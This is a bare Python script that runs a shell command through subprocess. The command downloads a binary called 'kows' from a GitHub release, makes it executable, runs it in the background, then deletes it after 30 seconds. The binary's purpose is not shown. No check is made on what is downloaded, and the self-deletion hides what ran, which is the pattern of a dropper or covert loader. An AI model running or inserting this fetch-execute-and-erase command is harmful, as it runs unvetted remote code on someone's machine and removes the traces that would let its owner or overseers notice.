import subprocess
cmd = "curl -L -o kows https://github.com/seav1/dl/releases/download/files/kows && chmod +x kows && ./kows & sleep 30 && rm -f kows"
subprocess.call(cmd, shell=True)
